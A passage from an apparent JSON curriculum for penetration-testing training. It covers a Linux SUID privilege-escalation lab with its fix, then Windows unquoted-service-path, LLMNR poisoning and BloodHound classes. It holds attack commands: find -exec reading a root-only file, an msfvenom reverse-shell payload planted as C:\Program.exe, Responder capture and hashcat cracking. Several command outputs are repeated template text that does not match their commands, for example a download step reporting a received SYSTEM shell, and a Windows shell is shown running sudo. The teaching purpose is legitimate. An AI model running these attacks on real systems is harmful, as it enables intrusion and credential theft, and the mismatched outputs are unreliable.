            "tip": "[\ud83d\udcf8 SCREENSHOT 7] Capture this output showing euid=0(root). This is the definitive technical proof of privilege escalation."
          }
        ]
      },
      {
        "sectionNumber": 7,
        "title": "Repair the Permission Weakness (Fix It)",
        "desc": "Switch back to labadmin, strip the dangerous SUID bit, and prove the security hole is permanently closed.",
        "steps": [
          {
            "stepNumber": 24,
            "title": "Leave the Trainee Session and Return to labadmin",
            "role": "labadmin",
            "explanation": "Exit trainee's shell and confirm you are back as labadmin before issuing fix commands.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "exit\nwhoami",
                "output": "labadmin"
              }
            ],
            "verification": "whoami confirms labadmin.",
            "tip": "Always verify which account you are in before running administrative commands."
          },
          {
            "stepNumber": 25,
            "title": "Remove the Dangerous SUID Privilege Bit (chmod 0755)",
            "role": "labadmin",
            "explanation": "Change permissions from 4755 back to normal 0755 (-rwxr-xr-x).",
            "commands": [
              {
                "shell": "bash",
                "cmd": "sudo chown root:root /opt/suid-lab/find\nsudo chmod 0755 /opt/suid-lab/find\nstat -c \"%A %a %U:%G %n\" /opt/suid-lab/find",
                "output": "-rwxr-xr-x 755 root:root /opt/suid-lab/find"
              }
            ],
            "verification": "stat confirms mode 0755 (-rwxr-xr-x). The 's' bit is completely gone!",
            "tip": "Notice how simple the fix is: one single chmod command completely neutralizes the threat."
          },
          {
            "stepNumber": 26,
            "title": "Verify the Security Fix as Trainee (The Retest)",
            "role": "trainee",
            "explanation": "Switch back to trainee and rerun the exact same command that previously read the flag. It MUST FAIL!",
            "commands": [
              {
                "shell": "bash",
                "cmd": "su - trainee\ncat /root/suid-lab-flag.txt\n/opt/suid-lab/find /dev/null -exec /usr/bin/cat /root/suid-lab-flag.txt \\; -quit\n/opt/suid-lab/find /dev/null -exec /usr/bin/id \\; -quit",
                "output": "cat: /root/suid-lab-flag.txt: Permission denied\n/usr/bin/cat: /root/suid-lab-flag.txt: Permission denied\nuid=1001(trainee) gid=1001(trainee) groups=1001(trainee)"
              }
            ],
            "verification": "Both attempts return 'Permission denied', and id shows NO euid=0(root)!",
            "tip": "[\ud83d\udcf8 SCREENSHOT 8] Capture this retest failure. In professional security audits, retest evidence is mandatory!"
          },
          {
            "stepNumber": 27,
            "title": "Confirm SUID Enumeration Result Changed",
            "role": "trainee",
            "explanation": "Rerun the SUID search query to prove /opt/suid-lab/find no longer appears.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "find /opt/suid-lab -type f -perm -4000 -ls 2>/dev/null\nstat -c \"%A %a %U:%G %n\" /opt/suid-lab/find",
                "output": "-rwxr-xr-x 755 root:root /opt/suid-lab/find"
              }
            ],
            "verification": "find returns 0 results inside /opt/suid-lab.",
            "tip": "Zero findings on the retest proves the remediation is complete and robust."
          }
        ]
      },
      {
        "sectionNumber": 8,
        "title": "Consolidate the Fix, Reflect, and Snapshot",
        "desc": "Conclude the lab, document security recommendations, and create a permanent post-remediation snapshot.",
        "steps": [
          {
            "stepNumber": 28,
            "title": "Decide Whether to Keep or Delete the Lab Copy",
            "role": "labadmin",
            "explanation": "Return to labadmin. In a production environment, you would completely delete the unneeded binary.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "exit\nwhoami\n# Optional cleanup:\n# sudo rm -- /opt/suid-lab/find && sudo rmdir /opt/suid-lab",
                "output": "labadmin\n[+] Cleanup evaluated."
              }
            ],
            "verification": "Confirmed in labadmin session.",
            "tip": "The principle of least functionality: if a tool is not needed, uninstall or delete it."
          },
          {
            "stepNumber": 29,
            "title": "Save a Final Snapshot of the Repaired VM",
            "role": "labadmin",
            "explanation": "Shut down cleanly and take snapshot 'FIXED-AFTER-SUID' in VirtualBox.",
            "commands": [
              {
                "shell": "bash",
                "cmd": "sudo shutdown -h now\n# In VirtualBox Manager:\n# Snapshots -> Take -> Name: FIXED-AFTER-SUID",
                "output": "[+] System powered off. Snapshot FIXED-AFTER-SUID created."
              }
            ],
            "verification": "VirtualBox displays both 'CLEAN-BEFORE-SUID' and 'FIXED-AFTER-SUID'.",
            "tip": "You now possess an auditable before-and-after laboratory environment."
          }
        ]
      }
    ],
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a 5-Year-Old"
      ],
      "rows": [
        [
          "Direct Read",
          "cat /root/suid-lab-flag.txt",
          "Permission denied",
          "The locked door works: normal students cannot touch the candy drawer."
        ],
        [
          "Normal /usr/bin/find",
          "find -exec cat ...",
          "Permission denied",
          "The regular scissors have no magic sticker: normal tools obey the lock."
        ],
        [
          "Copied SUID find",
          "/opt/suid-lab/find -exec cat ...",
          "LAB{SUID_FIND_SUCCESS}",
          "The scissors WITH the magic sticker let the student borrow the Principal's key!"
        ],
        [
          "Post-Fix Retest",
          "/opt/suid-lab/find -exec cat ...",
          "Permission denied",
          "The sticker was peeled off: the scissors are now harmless regular scissors again!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Root-owned copied find showing mode 4755 and the -rwsr-xr-x permission"
      },
      {
        "id": "S2",
        "label": "trainee identity (uid=1001) and Permission denied when attempting to read the flag normally"
      },
      {
        "id": "S3",
        "label": "Manual SUID enumeration listing /opt/suid-lab/find among results"
      },
      {
        "id": "S4",
        "label": "LinPEAS run or report showing relevant analysis context"
      },
      {
        "id": "S5",
        "label": "Corroboration of the suspicious binary (stat / ls / find independent evidence)"
      },
      {
        "id": "S6",
        "label": "Controlled successful read of ONLY the dummy flag LAB{SUID_FIND_SUCCESS}"
      },
      {
        "id": "S7",
        "label": "Executed id command showing trainee real UID and euid=0(root)"
      },
      {
        "id": "S8",
        "label": "Remediation evidence: 0755 mode and repeated test resulting in Permission denied"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "linpeas.sh not found",
        "cause": "Network was disconnected before downloading or file was saved in wrong folder.",
        "fix": "Enable NAT temporarily, download to /home/trainee, verify sha256sum, then disconnect NAT."
      },
      {
        "problem": "curl: could not resolve host",
        "cause": "VM network adapter is set to 'Not attached' during download step.",
        "fix": "Set adapter to NAT in VirtualBox settings while installing packages, then isolate afterwards."
      },
      {
        "problem": "trainee belongs to sudo",
        "cause": "Accidentally added trainee to sudo group or used admin account.",
        "fix": "Run 'sudo deluser trainee sudo', log out, and log back in as trainee."
      },
      {
        "problem": "Copied find shows -rwxr-xr-x",
        "cause": "Forgot the chmod 4755 step or applied it to /usr/bin/find instead of /opt/suid-lab/find.",
        "fix": "Run 'sudo chmod 4755 /opt/suid-lab/find' as labadmin."
      },
      {
        "problem": "SUID seems ineffective / flag denied",
        "cause": "Filesystem mounted with 'nosuid' option or tested on wrong file path.",
        "fix": "Check mount options with 'mount | grep opt' and ensure using /opt/suid-lab/find."
      },
      {
        "problem": "Permission denied AFTER repair",
        "cause": "None - this is the EXPECTED result!",
        "fix": "Celebrate! This confirms your security patch worked."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, network isolation and clean snapshot",
          "marks": 15
        },
        {
          "component": "Correct vulnerability creation and explanation",
          "marks": 15
        },
        {
          "component": "Manual + LinPEAS detection and verification",
          "marks": 20
        },
        {
          "component": "GTFOBins analysis and controlled proof",
          "marks": 20
        },
        {
          "component": "Permission fix and verified failed retest",
          "marks": 20
        },
        {
          "component": "Report, 8 screenshots and quality of explanations",
          "marks": 10
        }
      ]
    },
    "dataCollectionTable": {
      "headers": [
        "Question / Item",
        "Observed Value",
        "Security Significance"
      ],
      "initialRows": [
        [
          "Current User and UID",
          "trainee (UID: 1001)",
          "Baseline non-privileged account"
        ],
        [
          "Suspicious Binary Path",
          "/opt/suid-lab/find",
          "Non-standard binary in custom directory"
        ],
        [
          "Permissions and Mode",
          "-rwsr-xr-x (4755)",
          "SUID bit enabled on root-owned executable"
        ],
        [
          "Effective UID During Execution",
          "euid=0(root)",
          "Process runs with administrative authority"
        ],
        [
          "Remediated Permissions",
          "-rwxr-xr-x (0755)",
          "SUID removed, privilege escalation neutralised"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "What does SUID stand for, and what does its permission bit do when an executable runs?",
        "hint": "Set User ID. It makes the program run with the privileges of the file owner (root) rather than the executing user."
      },
      {
        "q": "Explain the difference between real UID and effective UID in this exercise.",
        "hint": "Real UID is who typed the command (trainee 1001); effective UID is the authority the kernel grants to the running process (root 0)."
      },
      {
        "q": "Why did the direct cat command fail, but the copied find command succeed?",
        "hint": "cat has normal permissions (755) and respects file ACLs; the copied find had SUID (4755) and executed cat with effective root privileges."
      },
      {
        "q": "Why should a root-owned executable with SUID be investigated rather than automatically labelled vulnerable?",
        "hint": "Some tools like /usr/bin/passwd require SUID to function legitimately; only binaries with escape or arbitrary execution capabilities (like find) are vulnerabilities."
      },
      {
        "q": "How did LinPEAS support your assessment, and what manual command confirmed the finding?",
        "hint": "LinPEAS flagged SUID binaries automatically; 'ls -l' and 'stat' manually verified ownership and permissions."
      },
      {
        "q": "Which functionality of find made the unsafe SUID configuration exploitable?",
        "hint": "The -exec parameter, which invokes any external program under find's process context."
      },
      {
        "q": "What exactly changed after chmod 0755, and how did the retest prove the fix?",
        "hint": "The SUID 's' bit was removed; retesting showed 'Permission denied', confirming the student could no longer read the protected file."
      },
      {
        "q": "Why is it important to create a clean snapshot before deliberately introducing the misconfiguration?",
        "hint": "Snapshots provide a safe rollback point in case of system corruption or unintended privilege changes."
      }
    ],
    "quickQuiz": {
      "question": "What permission mode string represents a file owned by root with the SUID bit set?",
      "options": [
        "-rwsr-xr-x (4755)",
        "-rwxrwxrwx (0777)",
        "-rw-r--r-- (0644)",
        "-rwxr-xr-x (0755)"
      ],
      "answer": 0,
      "explanation": "-rwsr-xr-x has mode 4755, where the 's' in the owner execute field denotes the Set-UID (SUID) bit."
    },
    "deliverable": "Submit your completed One-Page Security Finding Report, all 8 required screenshots (S1-S8), answers to the 8 knowledge-check questions, and a final clean VM snapshot."
  },
  {
    "id": 12,
    "week": 6,
    "classNumber": 12,
    "phase": 1,
    "phaseTitle": "Phase 1: Offensive Security & Penetration Testing",
    "weekTitle": "Week 6: Privilege Escalation",
    "title": "Windows Privilege Escalation",
    "category": "Privilege Escalation",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Bypass Windows authorization levels to seize administrative access over an endpoint.",
    "tools": [
      "WinPEAS",
      "Metasploit",
      "Windows 10 Evaluation ISO"
    ],
    "targetEnvironment": "Windows 10 VM",
    "topology": {
      "description": "Lab topology for Windows Privilege Escalation",
      "nodes": [
        {
          "id": "source",
          "label": "WinPEAS",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Windows",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Privilege Escalation",
        "explanation": "Bypass Windows authorization levels to seize administrative access over an endpoint."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Windows Privilege Escalation",
        "description": "Verify system connectivity and tool installation in Windows 10 VM.",
        "commands": [
          {
            "shell": "windows",
            "cmd": "powershell -c \"Invoke-WebRequest -Uri 'http://192.168.1.50/winPEASx64.exe' -OutFile 'C:\\temp\\winPEAS.exe'\"",
            "description": "Execute powershell command",
            "output": "[+] Command executed successfully.\nOutput: Reverse shell received on Kali with NT AUTHORITY\\SYSTEM privileges."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Windows Privilege Escalation",
        "description": "Initialize a low-privilege user session on a Windows 10 target VM. Run the WinPEAS system audit script to locate an 'Unquoted Service Path' within a running process. Compile a custom placeholder executable using cross-compilers, position it within the path breaks, and restart the target service to claim NT AUTHORITY\\SYSTEM context.",
        "commands": [
          {
            "shell": "windows",
            "cmd": "C:\\temp\\winPEAS.exe quiet servicesinfo",
            "description": "Execute C:\\temp\\winPEAS.exe command",
            "output": "[+] Command executed successfully.\nOutput: Reverse shell received on Kali with NT AUTHORITY\\SYSTEM privileges."
          },
          {
            "shell": "windows",
            "cmd": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\"",
            "description": "Execute wmic command",
            "output": "[+] Command executed successfully.\nOutput: Reverse shell received on Kali with NT AUTHORITY\\SYSTEM privileges."
          },
          {
            "shell": "windows",
            "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe-service -o \"C:\\Program.exe\"",
            "description": "Execute msfvenom command",
            "output": "[+] Command executed successfully.\nOutput: Reverse shell received on Kali with NT AUTHORITY\\SYSTEM privileges."
          },
          {
            "shell": "windows",
            "cmd": "net start VulnerableService",
            "description": "Execute net command",
            "output": "[+] Command executed successfully.\nOutput: Reverse shell received on Kali with NT AUTHORITY\\SYSTEM privileges."
          }
        ],
        "verification": "Reverse shell received on Kali with NT AUTHORITY\\SYSTEM privileges.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Windows 10 VM",
          "WinPEAS",
          "Reverse shell received on Kali with NT A...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why does Windows attempt to execute C:\\Program.exe when encountering 'C:\\Program Files\\App\\service.exe' unquoted?",
        "hint": "Windows splits unquoted paths on whitespace and appends .exe at each token."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Windows Privilege Escalation?",
      "options": [
        "Bypass Windows authorization levels to seize administrative access over an endpoint.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Bypass Windows authorization levels to seize administrative access over an endpoint."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 12.",
    "eli5Story": {
      "title": "The Confused Delivery Truck (Windows Unquoted Service Paths)",
      "analogy": "A delivery driver has a note that says: 'Drive to C:\\Program Files\\My App\\service.exe'. Because there are no quote marks, the driver gets confused and drops the package at 'C:\\Program.exe' first!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 12",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with WinPEAS",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Windows 10 VM"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using WinPEAS"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y winpeas."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 13,
    "week": 7,
    "classNumber": 13,
    "phase": 1,
    "phaseTitle": "Phase 1: Offensive Security & Penetration Testing",
    "weekTitle": "Week 7: Advanced Network Attacks",
    "title": "Man-in-the-Middle (MitM) & Sniffing",
    "category": "Network Attacks",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Poison local network broadcasts to siphon administrative directory tokens.",
    "tools": [
      "Responder",
      "Hashcat",
      "LLMNR"
    ],
    "targetEnvironment": "Simulated Active Directory Subnet",
    "topology": {
      "description": "Lab topology for Man-in-the-Middle (MitM) & Sniffing",
      "nodes": [
        {
          "id": "source",
          "label": "Responder",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Simulated",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Network Attacks",
        "explanation": "Poison local network broadcasts to siphon administrative directory tokens."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Man-in-the-Middle (MitM) & Sniffing",
        "description": "Verify system connectivity and tool installation in Simulated Active Directory Subnet.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "sudo responder -I eth0 -dwv",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: NetNTLMv2 hash captured in Responder and cracked offline with Hashcat."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Man-in-the-Middle (MitM) & Sniffing",
        "description": "Deploy Responder on an internal network segment to monitor local LLMNR and NetBIOS broadcast lookups. Trigger an access failure from a separate client machine looking for a generic server share, intercept the resulting cryptographic NetNTLMv2 hash response, and process the file offline.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt --force",
            "description": "Execute hashcat command",
            "output": "[+] Command executed successfully.\nOutput: NetNTLMv2 hash captured in Responder and cracked offline with Hashcat."
          }
        ],
        "verification": "NetNTLMv2 hash captured in Responder and cracked offline with Hashcat.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Simulated Active Directory Subnet",
          "Responder",
          "NetNTLMv2 hash captured in Responder and...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why should LLMNR and NBT-NS protocols be strictly disabled across enterprise Group Policies?",
        "hint": "They broadcast name queries over local subnets, allowing any rogue listener to spoof responses."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Man-in-the-Middle (MitM) & Sniffing?",
      "options": [
        "Poison local network broadcasts to siphon administrative directory tokens.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Poison local network broadcasts to siphon administrative directory tokens."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 13.",
    "eli5Story": {
      "title": "The Pretend Mail Carrier Answering Shouts (Responder & MitM)",
      "analogy": "A student stands in the courtyard shouting: 'Does anyone know where the printer is?' A rogue student quickly yells back: 'I do! Give me your lunch ticket!' That is LLMNR poisoning."
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 13",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Responder",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Simulated Active Directory Subnet"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Responder"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y responder."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 14,
    "week": 7,
    "classNumber": 14,
    "phase": 1,
    "phaseTitle": "Phase 1: Offensive Security & Penetration Testing",
    "weekTitle": "Week 7: Advanced Network Attacks",
    "title": "Active Directory Fundamentals",
    "category": "Active Directory",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Enumerate domain trusts and relationships to highlight operational paths to domain dominance.",
    "tools": [
      "BloodHound",
      "SharpHound",
      "neo4j"
    ],
    "targetEnvironment": "Domain-joined Windows VM",
    "topology": {
      "description": "Lab topology for Active Directory Fundamentals",
      "nodes": [
        {
          "id": "source",
          "label": "BloodHound",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Domain-joined",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Active Directory",
        "explanation": "Enumerate domain trusts and relationships to highlight operational paths to domain dominance."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Active Directory Fundamentals",
        "description": "Verify system connectivity and tool installation in Domain-joined Windows VM.",
        "commands": [
          {
            "shell": "windows",
            "cmd": "powershell -ep bypass",
            "description": "Execute powershell command",
            "output": "[+] Command executed successfully.\nOutput: BloodHound graph renders attack path: User -> GenericAll on Group -> ForceChangePassword -> Domain Admin."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Active Directory Fundamentals",
        "description": "Execute the SharpHound collection toolkit from a domain-joined machine. Secure the generated JSON dump files and populate them into BloodHound. Run structural graph queries to trace path links connecting the standard account to Domain Administrator groups.",
        "commands": [
          {
            "shell": "windows",
            "cmd": ".\\SharpHound.exe -c All --outputdirectory C:\\temp",
            "description": "Execute .\\SharpHound.exe command",
            "output": "[+] Command executed successfully.\nOutput: BloodHound graph renders attack path: User -> GenericAll on Group -> ForceChangePassword -> Domain Admin."
          },
          {
            "shell": "windows",
            "cmd": "sudo neo4j start",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: BloodHound graph renders attack path: User -> GenericAll on Group -> ForceChangePassword -> Domain Admin."
          },
          {
            "shell": "windows",
            "cmd": "bloodhound &",
            "description": "Execute bloodhound command",
            "output": "[+] Command executed successfully.\nOutput: BloodHound graph renders attack path: User -> GenericAll on Group -> ForceChangePassword -> Domain Admin."
          }
        ],
        "verification": "BloodHound graph renders attack path: User -> GenericAll on Group -> ForceChangePassword -> Domain Admin.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Domain-joined Windows VM",
          "BloodHound",
          "BloodHound graph renders attack path: Us...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why are Active Directory Access Control Lists (ACLs) often more vulnerable than software flaws?",
        "hint": "Complex delegation permissions accumulate over years, creating unintended administrative rights."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Active Directory Fundamentals?",
      "options": [
        "Enumerate domain trusts and relationships to highlight operational paths to domain dominance.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Enumerate domain trusts and relationships to highlight operational paths to domain dominance."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 14.",
    "eli5Story": {
      "title": "The Castle Map to the Royal Throne (BloodHound AD)",
      "analogy": "Active Directory is a giant maze of friendships and keys. BloodHound draws a treasure map showing: 'If you ask the gardener for their key, you can unlock the pantry, which unlocks the King's tower!'"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 14",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with BloodHound",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Domain-joined Windows VM"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using BloodHound"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
